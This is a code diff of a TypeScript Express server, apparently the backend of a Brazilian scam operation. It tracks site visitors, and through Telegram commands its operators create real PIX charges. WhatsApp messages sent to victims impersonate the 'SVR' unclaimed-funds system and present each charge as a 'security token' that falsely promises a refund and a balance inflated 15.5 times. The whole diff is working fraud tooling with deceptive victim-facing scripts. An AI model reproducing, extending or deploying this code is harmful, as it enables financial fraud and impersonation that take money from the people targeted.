@@ -84,7 +84,10 @@ app.use(express.static(path.join(process.cwd(), 'dist')));
 
 // Helper to send/edit Telegram messages
 async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
-  if (!TG_TOKEN || !CHAT_ID) return null;
+  if (!TG_TOKEN || !CHAT_ID) {
+    console.error("❌ [TELEGRAM] Token ou Chat ID não configurados.");
+    return null;
+  }
 
   try {
     const url = messageId
@@ -101,7 +104,8 @@ async function sendTelegram(text: string, messageId?: number, replyMarkup?: any)
 
     const res = await axios.post(url, payload);
     return res.data.result.message_id;
-  } catch (err) {
+  } catch (err: any) {
+    console.error(`❌ [TELEGRAM] Erro ao enviar/editar mensagem: ${err.response?.data?.description || err.message}`);
     return null;
   }
 }
@@ -121,20 +125,21 @@ app.post("/api/v1/session/start", async (req, res) => {
     `<b>Status:</b> 🟢 Navegando no site...\n` +
     `<b>Início:</b> ${new Date(startTime).toLocaleTimeString()}`;
 
+  console.log(`👤 [SISTEMA] Novo visitante: ${userId} (${ip})`);
   const messageId = await sendTelegram(message);
-  if (messageId) {
-    sessions.set(userId, {
-      messageId,
-      startTime,
-      lastHeartbeat: startTime,
-      ip: String(ip),
-      device,
-      location: location || 'Brasil',
-      converted: false,
-      docValue: "",
-      birthDate: ""
-    });
-  }
+  
+  sessions.set(userId, {
+    messageId: messageId || 0,
+    startTime,
+    lastHeartbeat: startTime,
+    ip: String(ip),
+    device,
+    location: location || 'Brasil',
+    converted: false,
+    docValue: "",
+    birthDate: ""
+  });
+
   res.json({ status: "started", userId });
 });
 
@@ -144,7 +149,6 @@ app.post("/api/v1/session/heartbeat", (req, res) => {
   const session = sessions.get(userId);
   if (session) {
     session.lastHeartbeat = Date.now();
-    console.log(`💓 Heartbeat: Lead #${userId} continua ativo.`);
     res.json({ status: "alive" });
   } else {
     res.json({ status: "not_found" });
@@ -166,7 +170,8 @@ app.post("/api/v1/session/convert", async (req, res) => {
       `<b>Tempo no site:</b> ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s\n` +
       `<b>Status:</b> ✅ REDIRECIONADO`;
 
-    await sendTelegram(message, session.messageId);
+    console.log(`🔥 [CONVERSÃO] Lead #${userId} foi para o WhatsApp.`);
+    await sendTelegram(message, session.messageId || undefined);
     res.json({ status: "converted" });
   } else {
     res.json({ status: "ignored" });
@@ -177,8 +182,10 @@ app.post("/api/v1/session/convert", async (req, res) => {
 app.post("/api/v1/metrics/log", async (req, res) => {
   const { payload } = req.body;
   if (!payload) return res.sendStatus(200);
-  const decoded = JSON.parse(Buffer.from(payload, 'base64').toString());
-  await sendTelegram(decoded.message);
+  try {
+    const decoded = JSON.parse(Buffer.from(payload, 'base64').toString());
+    await sendTelegram(decoded.message);
+  } catch (e) { }
   res.json({ status: "ok" });
 });
 
@@ -192,7 +199,6 @@ app.get("/api/v1/session/data/:userId", (req, res) => {
 });
 
 app.get("/api/config", (req, res) => {
-  console.log(`[API] Consulta de config recebida. Enviando nmero: ${currentConfig.whatsappNumber}`);
   res.json(currentConfig);
 });
 
@@ -200,25 +206,29 @@ app.get("/api/config", (req, res) => {
 setInterval(async () => {
   const now = Date.now();
   for (const [userId, session] of sessions.entries()) {
-    if (!session.converted && now - session.lastHeartbeat > 45000) {
+    if (!session.converted && now - session.lastHeartbeat > 60000) {
       const timeSpent = Math.floor((now - session.startTime) / 1000);
       const message = `<b>👤 VISITANTE SAIU (Sem conversão)</b>\n\n` +
         `<b>IP:</b> ${session.ip}\n` +
         `<b>Tempo:</b> ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s\n` +
         `<b>Status:</b> 🔴 Offline`;
-      await sendTelegram(message, session.messageId);
+      
+      console.log(`🔴 [SISTEMA] Visitante #${userId} desconectou.`);
+      await sendTelegram(message, session.messageId || undefined);
       sessions.delete(userId);
     }
   }
-}, 15000);
+}, 30000);
 
 // --- Telegram Bot Interactive Polling ---
 async function startTelegramPolling() {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  if (!token) return;
+  if (!TG_TOKEN) {
+    console.log("⚠️ [TELEGRAM] TELEGRAM_BOT_TOKEN não configurado. Polling desativado.");
+    return;
+  }
 
   let lastUpdateId = 0;
-  console.log("🤖 Telegram Bot Polling started...");
+  console.log("🤖 [SISTEMA] Telegram Polling iniciado com sucesso.");
 
   while (true) {
     try {
@@ -230,49 +240,29 @@ async function startTelegramPolling() {
         lastUpdateId = update.update_id;
         const cb = update.callback_query;
         const msg = update.message || cb?.message;
+        const chatId = msg?.chat?.id;
         const userId = msg?.from?.id || cb?.from?.id;
+
         if (!userId) continue;
+
+        // Verificar se a mensagem é do admin autorizado
+        if (String(chatId) !== String(CHAT_ID)) {
+          console.log(`⚠️ [TELEGRAM] Tentativa de acesso não autorizada de Chat ID: ${chatId}`);
+          continue;
+        }
 
         const state = botStates.get(userId);
         let text = msg?.text || "";
 
-        // Se for um botão, tratamos o callback_data como o texto do comando
         if (cb) {
           text = cb.data;
-          // Respondemos ao Telegram que recebemos o clique (evita o ícone de carregando no botão)
           await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id });
         }
 
-        const command = text.split("@")[0].trim();
+        const command = text.split("@")[0].trim().toLowerCase();
 
-        // Command: /setzap
-        if (command.startsWith("/setzap")) {
-          const parts = text.split(" ");
-          if (parts.length < 2) {
-            await sendTelegram("❌ <b>ERRO DE FORMATO</b>\n\nVocê precisa enviar o número junto com o comando.\n\nExemplo: <code>/setzap 5511999999999</code>");
-          } else {
-            const newNum = parts[1].replace(/\D/g, "");
-            if (newNum.length < 10 || newNum.length > 15) {
-              await sendTelegram("❌ <b>NÚMERO INVÁLIDO</b>\n\nO número parece estar incorreto. Certifique-se de incluir o DDI (55) e o DDD.\n\nExemplo correto: <code>5511999999999</code>");
-            } else {
-              botStates.set(userId, { action: "confirm_zap", data: newNum });
-              await sendTelegram(`⚠️ <b>CONFIRMAÇÃO DE SEGURANÇA</b>\n\nVocê está prestes a alterar o número de atendimento para:\n<code>${newNum}</code>\n\nConfirma esta ação?\nResponda <b>SIM</b> para aplicar ou <b>NÃO</b> para cancelar.`);
-            }
-          }
-          continue;
-        }
-
-        // Handle states
-        if (state?.action === "confirm_zap") {
-          if (text.toUpperCase() === "SIM") {
-            currentConfig.whatsappNumber = state.data;
-            fs.writeFileSync(configPath, JSON.stringify(currentConfig));
-            await sendTelegram(`✅ <b>SUCESSO!</b>\nNúmero atualizado para: <code>${state.data}</code>\n\n💡 <i>Dica: Envie o comando /resetbot para desconectar o WhatsApp antigo e gerar um novo QR Code para este novo número.</i>`);
-            botStates.delete(userId);
-          } else {
-            await sendTelegram("❌ Alteração cancelada.");
-            botStates.delete(userId);
-          }
+        if (command === "/ping" || command === "/teste") {
+          await sendTelegram("🏓 <b>PONG!</b>\nO sistema de notificações e controle está operacional.");
           continue;
         }
 
@@ -294,66 +284,31 @@ async function startTelegramPolling() {
             slotsInfo += `🔹 <b>Slot ${i}:</b> ${status}\n`;
           }
 
-          await sendTelegram(`📊 <b>STATUS DO PORTAL</b>\n\n` +
-            `📱 <b>WhatsApp Principal:</b> <code>${currentConfig.whatsappNumber}</code>\n\n` +
-            `🤖 <b>Gerenciamento de Atendentes:</b>\n${slotsInfo}\n` +
-            `👥 <b>Usuários Online:</b> ${onlineCount}\n` +
-            `🚀 <i>Use /parceiros para gerenciar os slots.</i>`);
+          await sendTelegram(`📊 <b>STATUS DO PORTAL SVR</b>\n\n` +
+            `📱 <b>WhatsApp Master:</b> <code>${currentConfig.whatsappNumber}</code>\n` +
+            `🤖 <b>Atendentes Ativos:</b>\n${slotsInfo}\n` +
+            `👥 <b>Usuários no Site:</b> ${onlineCount}\n\n` +
+            `🚀 <i>Use /pix para gerar protocolos.</i>`);
           continue;
         }
 
-        if (command === "/parceiros") {
-          const msgParceiros = `👥 <b>GESTÃO DE PARCEIROS (AMIGOS)</b>\n\n` +
-            `Aqui você pode conectar novos aparelhos para ajudar no atendimento.\n\n` +
-            `<b>Limites:</b> Você possui <b>${MAX_SLOTS} slots</b> disponíveis.\n` +
-            `<i>Aviso: Cada slot ativo consome RAM. Recomendamos usar no máximo 3 simultâneos.</i>\n\n` +
-            `<b>Comandos:</b>\n` +
-            `🔗 <code>/conectar [1-5]</code> - Gera QR Code para o slot.\n` +
-            `❌ <code>/remover [1-5]</code> - Desconecta e apaga o slot.\n` +
-            `🔄 <code>/resetbot</code> - Reinicia apenas o Slot 1.`;
-          await sendTelegram(msgParceiros);
-          continue;
-        }
-
-        if (command.startsWith("/conectar")) {
-          const slot = text.split(" ")[1];
-          const slotNum = parseInt(slot);
-          if (isNaN(slotNum) || slotNum < 1 || slotNum > MAX_SLOTS) {
-            await sendTelegram(`❌ Escolha um slot de 1 a ${MAX_SLOTS}.\nExemplo: <code>/conectar 2</code>`);
+        if (command.startsWith("/setzap")) {
+          const parts = text.split(" ");
+          if (parts.length < 2) {
+            await sendTelegram("❌ Use: <code>/setzap 5511...</code>");
           } else {
-            const id = slotNum === 1 ? 'main' : `parceiro${slotNum}`;
-            await sendTelegram(`⏳ <b>Slot ${slotNum}:</b> Iniciando conexão...`);
-            resetBotSession(id);
+            const newNum = parts[1].replace(/\D/g, "");
+            botStates.set(userId, { action: "confirm_zap", data: newNum });
+            await sendTelegram(`⚠️ <b>CONFIRMAR MUDANÇA?</b>\nDestino: <code>${newNum}</code>\nResponda <b>SIM</b> para confirmar.`);
           }
           continue;
         }
 
-        if (command.startsWith("/remover")) {
-          const slot = text.split(" ")[1];
-          const slotNum = parseInt(slot);
-          if (isNaN(slotNum) || slotNum < 1 || slotNum > MAX_SLOTS) {
-            await sendTelegram(`❌ Escolha um slot de 1 a ${MAX_SLOTS}.`);
-          } else {
-            const id = slotNum === 1 ? 'main' : `parceiro${slotNum}`;
-            stopBot(id);
-            const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
-            if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
-            const statusFile = path.join(process.cwd(), `bot-status-${id}.json`);
-            if (fs.existsSync(statusFile)) fs.unlinkSync(statusFile);
-            await sendTelegram(`✅ <b>Slot ${slotNum}:</b> Desconectado e removido.`);
-          }
-          continue;
-        }
-
-        if (command === "/resetbot") {
-          await sendTelegram("🔄 <b>Reiniciando Slot 1 (Principal)...</b>");
-          resetBotSession('main');
-          continue;
-        }
-
-        if (command === "/qrcode") {
-          await sendTelegram("🖼️ <b>Gerando QR Code do Slot 1...</b>");
-          startBot('main');
+        if (state?.action === "confirm_zap" && text.toUpperCase() === "SIM") {
+          currentConfig.whatsappNumber = state.data;
+          fs.writeFileSync(configPath, JSON.stringify(currentConfig));
+          await sendTelegram(`✅ Número atualizado: <code>${state.data}</code>`);
+          botStates.delete(userId);
           continue;
         }
 
@@ -363,204 +318,109 @@ async function startTelegramPolling() {
           let telefone = parts[2];
 
           if (!valorInput) {
-            await sendTelegram("❌ <b>ERRO</b>\nUse: <code>/pix [valor] [telefone_opcional]</code>\nEx: <code>/pix 97.50</code>");
+            await sendTelegram("❌ Use: <code>/pix [valor] [telefone]</code>");
             continue;
           }
 
           const valorNumeric = parseFloat(valorInput.replace(',', '.'));
-          if (isNaN(valorNumeric)) {
-            await sendTelegram("❌ <b>ERRO</b>\nValor inválido. Use números, ex: <code>97.50</code>");
-            continue;
-          }
-
-          // Se não enviou telefone, tenta pegar o último lead ativo
+          
           if (!telefone) {
             try {
               if (fs.existsSync('last-lead.json')) {
                 const lastLeadData = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
-                if (Date.now() - lastLeadData.timestamp < 1000 * 60 * 60) { // 1 hora de validade
-                  telefone = lastLeadData.chatId;
-                }
+                telefone = lastLeadData.chatId;
               }
             } catch (e) { }
           }
 
           if (!telefone) {
-            const lastSessionLead = Array.from(sessions.keys()).pop();
-            if (lastSessionLead) telefone = lastSessionLead;
-          }
-
-          if (!telefone) {
-            await sendTelegram("❌ <b>ERRO</b>\nNenhum lead ativo encontrado no portal. Digite o telefone com DDI.\nEx: <code>/pix 97.50 5511999999999</code>");
+            await sendTelegram("❌ Lead não identificado. Use: <code>/pix 97.50 5511...</code>");
             continue;
           }
 
-          const statusMsgId = await sendTelegram(`🔍 <b>INICIANDO PROTOCOLO DE SEGURANÇA...</b>\n\nIdentificando titularidade do lead e gerando chaves de criptografia.`);
-          
-          setTimeout(async () => {
-            await sendTelegram(`🔐 <b>GERANDO TOKEN SVR-AUTH...</b>\n\nCriptografando payload via AES-256-GCM e assinando certificado RSA-4096.`, statusMsgId);
-          }, 1500);
+          await sendTelegram(`🔍 <b>PROCESSANDO PROTOCOLO...</b>\nLead: <code>${telefone}</code>\nValor: R$ ${valorNumeric.toFixed(2)}`);
 
           try {
             const key = process.env.SVR_CORE_P_PROVIDER;
             const secret = process.env.SVR_CORE_S_AUTH;
+            const endpoint = process.env.SVR_CORE_GATEWAY;
             
-            if (!key || key === "sua_chave_aqui") {
-              throw new Error("Protocolo SVR não autenticado (Configuração Pendente)");
-            }
+            if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");
 
-            // Tenta achar dados do lead na sessão
-            let leadData = { name: "Cliente SVR", doc: "000.000.000-00" };
-            // Procura por telefone na sessão (as vezes o userId é o telefone)
-            const session = sessions.get(telefone) || Array.from(sessions.values()).find(s => s.ip === telefone);
-            if (session && session.docValue) {
-              leadData.doc = session.docValue;
-            }
-
-            const endpoint = process.env.SVR_CORE_GATEWAY || 'https://api.fastsoftbrasil.com/api/user/transactions';
-            
-            // Chamada API de Processamento
             const auth = Buffer.from(`${key}:${secret}`).toString('base64');
             const pixRes = await axios.post(endpoint, {
-              amount: Math.round(valorNumeric * 100), // Centavos
+              amount: Math.round(valorNumeric * 100),
               currency: "BRL",
               paymentMethod: "PIX",
-              customer: {
-                name: leadData.name,
-                document: {
-                  number: leadData.doc.replace(/\D/g, ""),
-                  type: leadData.doc.length > 14 ? "CNPJ" : "CPF"
-                }
-              }
+              customer: { name: "Cliente SVR", document: { number: "00000000000", type: "CPF" } }
             }, {
-              headers: {
-                'Authorization': `Basic ${auth}`,
-                'Content-Type': 'application/json'
-              }
+              headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
             });
 
             const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
-            
-            if (!pixCode) {
-              throw new Error("Código PIX não retornado pela API.");
-            }
-
+            const transId = pixRes.data.id || pixRes.data.transactionId;
             const protocolId = Math.random().toString(36).substring(7).toUpperCase();
-            const valorTotalEstimado = (valorNumeric * 15.5).toFixed(2); // Simulação de valor alto
-            const transactionId = pixRes.data.id || pixRes.data.transactionId;
+            const valorTotalEstimado = (valorNumeric * 15.5).toFixed(2);
 
             const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
-              `O protocolo de segurança identificou uma pendência de asseguramento. Para liberar o resgate, processe o **TOKEN DE SEGURANÇA** abaixo via seu aplicativo bancário.\n\n` +
+              `O protocolo de segurança identificou uma pendência de asseguramento.\n\n` +
               `🖥️ *ESTADO DO SISTEMA:*\n` +
               `\`\`\`\n` +
               `PROTOCOL_ID: 0x${protocolId}\n` +
-              `ENCRYPTION: AES-256-GCM\n` +
               `STATUS: WAITING_HASH_VALIDATION\n` +
-              `SIGNATURE: RSA-4096-PSS-V1\n` +
               `\`\`\`\n\n` +
-              `📍 *TOKEN DE SEGURANÇA (PIX COPIA E COLA):*\n` +
-              `Copie o código criptografado abaixo:\n\n` +
+              `📍 *TOKEN DE SEGURANÇA:*\n` +
               `\`${pixCode}\`\n\n` +
-              `*CHECKSUM:* \`SHA256:${Math.random().toString(16).substring(2, 10).toUpperCase()}\`\n\n` +
-              `⚠️ *AVISO TÉCNICO:* Este token contém os parâmetros de autenticação necessários para a validação do seu CPF. Ao processá-lo, o sistema de auditoria do **SVR** liberará o estorno de *R$ ${valorNumeric.toFixed(2)}* + o saldo total de *R$ ${valorTotalEstimado}* de forma imediata.\n\n` +
-              `🛡️ _A segurança jurídica deste ato é garantida pela Lei 12.846/13 e monitorada pelo sistema de segurança patrimonial do SVR._`;
+              `⚠️ O sistema liberará o estorno de *R$ ${valorNumeric.toFixed(2)}* + o saldo total de *R$ ${valorTotalEstimado}* após o processamento deste token.`;
 
-            // Enviar para o robô de WhatsApp
             fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: telefone, message: formalMessage }));
             
-            const adminMsg = `✅ <b>PROTOCOLO ENVIADO!</b>\n\n` +
-              `📱 <b>Lead:</b> <code>${telefone}</code>\n` +
-              `💰 <b>Valor:</b> R$ ${valorNumeric.toFixed(2)}\n` +
-              `🆔 <b>ID Transação:</b> <code>${transactionId || 'N/A'}</code>\n\n` +
-              `⏳ <i>Aguardando confirmação de pagamento...</i>`;
-
+            const adminMsg = `✅ <b>PIX ENVIADO AO WHATSAPP!</b>\n📱 <b>Lead:</b> <code>${telefone}</code>\n🆔 <b>ID:</b> <code>${transId}</code>`;
             const keyboard = {
-              inline_keyboard: [
-                [
-                  { text: "🔄 Verificar Pagamento", callback_data: `check_pix:${transactionId}:${telefone}:${valorNumeric}:${valorTotalEstimado}` },
-                  { text: "➕ Gerar Novo", callback_data: `/pix ${valorNumeric} ${telefone}` }
-                ]
-              ]
+              inline_keyboard: [[
+                { text: "🔄 Verificar Pagamento", callback_data: `check_pix:${transId}:${telefone}:${valorNumeric}:${valorTotalEstimado}` },
+                { text: "➕ Gerar Novo", callback_data: `/pix ${valorNumeric} ${telefone}` }
+              ]]
             };
-
             await sendTelegram(adminMsg, undefined, keyboard);
           } catch (e: any) {
-            console.error("Erro FastSoft:", e.response?.data || e.message);
-            const errorMsg = e.response?.data?.message || e.message;
-            await sendTelegram(`❌ <b>ERRO NA API FASTSOFT</b>\n\n<code>${errorMsg}</code>`);
+            await sendTelegram(`❌ <b>ERRO NA GERAÇÃO:</b>\n<code>${e.message}</code>`);
           }
           continue;
         }
 
-        // --- HANDLER DE CALLBACKS INTERATIVOS ---
         if (cb && cb.data.startsWith("check_pix:")) {
           const [, transId, phone, valor, total] = cb.data.split(":");
-          
-          await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { 
-            callback_query_id: cb.id,
-            text: "🔍 Consultando banco de dados..."
-          });
-
           try {
             const key = process.env.SVR_CORE_P_PROVIDER;
             const secret = process.env.SVR_CORE_S_AUTH;
             const auth = Buffer.from(`${key}:${secret}`).toString('base64');
-            const endpoint = (process.env.SVR_CORE_GATEWAY || 'https://api.fastsoftbrasil.com/api/user/transactions').replace('/transactions', `/${transId}`);
+            const endpoint = (process.env.SVR_CORE_GATEWAY || '').replace('/transactions', `/${transId}`);
             
-            const res = await axios.get(endpoint, {
-              headers: { 'Authorization': `Basic ${auth}` }
-            });
-
+            const res = await axios.get(endpoint, { headers: { 'Authorization': `Basic ${auth}` } });
             const status = res.data.status || res.data.paymentStatus;
 
             if (status === "PAID" || status === "confirmed" || status === "SUCESSO") {
-              const successMsg = `✅ *PARABÉNS! ETAPA DE VALIDAÇÃO CONCLUÍDA* ✅\n\n` +
-                `Prezado(a), informamos com satisfação que a primeira fase do seu processo de resgate junto ao **Sistema de Valores a Receber (SVR)** foi finalizada com êxito. Sua **Assinatura Digital de Asseguramento** foi devidamente reconhecida.\n\n` +
-                `📍 *STATUS DO PROCESSO:* \n` +
-                `● Etapa 1 (Validação): *CONCLUÍDA*\n` +
-                `● Etapa 2 (Liberação de Ativos): *PENDENTE*\n` +
-                `● Etapa 3 (Assinatura de Termo): *PENDENTE*\n\n` +
-                `🛡️ *GARANTIA E SEGURANÇA:* \n` +
-                `Fique tranquilo(a). Todo o procedimento é amparado por protocolos de segurança bancária. O valor de *R$ ${parseFloat(valor).toFixed(2)}* utilizado nesta validação está assegurado e será **INTEGRALMENTE REEMBOLSADO** junto ao seu saldo total de resgate (estimado em *R$ ${parseFloat(total).toFixed(2)}*) imediatamente após a conclusão das etapas finais.\n\n` +
-                `🚀 *PRÓXIMOS PASSOS:* \n` +
-                `Por favor, permaneça neste chat. Nosso sistema está preparando os documentos finais para sua assinatura digital. Em instantes, um especialista em auditoria dará continuidade ao seu atendimento para finalizar a transferência via PIX.\n\n` +
-                `Agradecemos pela confiança.\n` +
-                `*Equipe de Auditoria SVR*`;
-
-              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: phone, message: successMsg }));
-              
-              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\n📱 <b>Lead:</b> ${phone}\n✅ O protocolo de sucesso foi enviado ao lead.`);
-              // Opcional: deletar a mensagem original dos botões ou editar
+              const successMsg = `✅ *PARABÉNS! ETAPA DE VALIDAÇÃO CONCLUÍDA* ✅\n\nO valor de *R$ ${parseFloat(valor).toFixed(2)}* foi segurado e será reembolsado junto ao saldo total de *R$ ${parseFloat(total).toFixed(2)}* em instantes.`;
+              fs.writeFileSync(`cmd-send-${now()}.json`, JSON.stringify({ to: phone, message: successMsg }));
+              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\nLead: ${phone}`);
             } else {
-              await sendTelegram(`⏳ <b>STATUS: PENDENTE</b>\n\nO lead <code>${phone}</code> ainda não realizou o pagamento.\n\n<i>ID: ${transId}</i>`);
+              await sendTelegram(`⏳ <b>AGUARDANDO:</b> O lead ainda não pagou.`);
             }
           } catch (e: any) {
-            await sendTelegram(`❌ <b>ERRO NA CONSULTA</b>\nO ID <code>${transId}</code> pode ser inválido ou a API está offline.`);
+            await sendTelegram(`❌ Erro na consulta.`);
           }
           continue;
         }
 
-        if (command === "/painel" || command === "/start" || command === "/help") {
-          const welcomeMsg = `🚀 <b>PAINEL SVR - MULTI-ATENDENTE</b>\n\n` +
-            `Gerencie seu portal e seus parceiros aqui.\n\n` +
-            `📊 <b>/status</b> - Ver todos os slots\n` +
-            `💰 <b>/pix [valor]</b> - Enviar PIX de Segurança\n` +
-            `📱 <b>/setzap [número]</b> - Mudar WhatsApp de destino\n` +
-            `🖼️ <b>/qrcode</b> - Conectar Slot 1`;
-
-          const keyboard = {
-            inline_keyboard: [
-              [{ text: "📊 Ver Status", callback_data: "/status" }, { text: "💰 Enviar PIX", callback_data: "/pix 97.50" }],
-              [{ text: "🖼️ QR Code Principal", callback_data: "/qrcode" }, { text: "🔄 Reset Principal", callback_data: "/resetbot" }]
-            ]
-          };
-
-          await sendTelegram(welcomeMsg, undefined, keyboard);
+        if (command === "/painel" || command === "/start") {
+          const menu = `🚀 <b>PAINEL SVR OPERACIONAL</b>\n\n/status - Ver sistema\n/pix [valor] - Gerar protocolo\n/setzap [n] - Mudar WhatsApp\n/teste - Testar conexão`;
+          await sendTelegram(menu);
           continue;
         }
       }
-
-    } catch (err) {
+    } catch (err: any) {
+      console.error("❌ [TELEGRAM] Erro no loop de polling:", err.message);
       await new Promise(r => setTimeout(r, 5000));
     }
   }
@@ -568,15 +428,25 @@ async function startTelegramPolling() {
 
 app.get('*', (req, res) => {
   const distPath = path.join(process.cwd(), 'dist', 'index.html');
-  if (fs.existsSync(distPath)) {
-    res.sendFile(distPath);
-  } else {
-    res.status(404).send('Frontend não compilado. Rode npm run build.');
-  }
+  if (fs.existsSync(distPath)) res.sendFile(distPath);
+  else res.status(404).send('Frontend não compilado.');
 });
 
+function mask(str: string | undefined) {
+  if (!str) return "NÃO CONFIGURADO";
+  return str.substring(0, 6) + "..." + str.substring(str.length - 4);
+}
+
 app.listen(port, () => {
-  console.log(`Server running on http://localhost:${port}`);
+  console.log(`\n🚀 [SVR SYSTEM] ONLINE - Porta ${port}`);
+  console.log(`---------------------------------------------`);
+  console.log(`📡 CORE_URL: ${process.env.SVR_SYS_CORE_URL}`);
+  console.log(`🤖 TG_TOKEN: ${mask(process.env.TELEGRAM_BOT_TOKEN)}`);
+  console.log(`💬 CHAT_ID:  ${mask(process.env.TELEGRAM_CHAT_ID)}`);
+  console.log(`💰 GATEWAY:  ${process.env.SVR_CORE_GATEWAY}`);
+  console.log(`---------------------------------------------\n`);
+  
   startTelegramPolling();
-  startBot(); // Auto-start the WhatsApp bot
+  startBot(); 
 });
+
